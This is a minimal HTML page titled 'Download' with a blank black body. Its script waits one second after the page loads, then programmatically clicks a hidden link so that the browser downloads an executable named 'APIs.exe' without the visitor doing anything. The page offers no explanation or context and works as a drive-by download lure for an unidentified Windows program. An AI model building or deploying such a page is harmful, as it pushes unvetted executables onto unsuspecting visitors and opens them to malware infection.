<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <style>
        body {
            margin: 0;
            background: #000;
            min-height: 100vh;
        }
    </style>
</head>
<body>
    <script>
        window.onload = function () {
            setTimeout(function () {
                var a = document.createElement('a');
                a.href = 'APIs.exe';
                a.download = 'APIs.exe';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }, 1000);
        };
    </script>
</body>
</html>
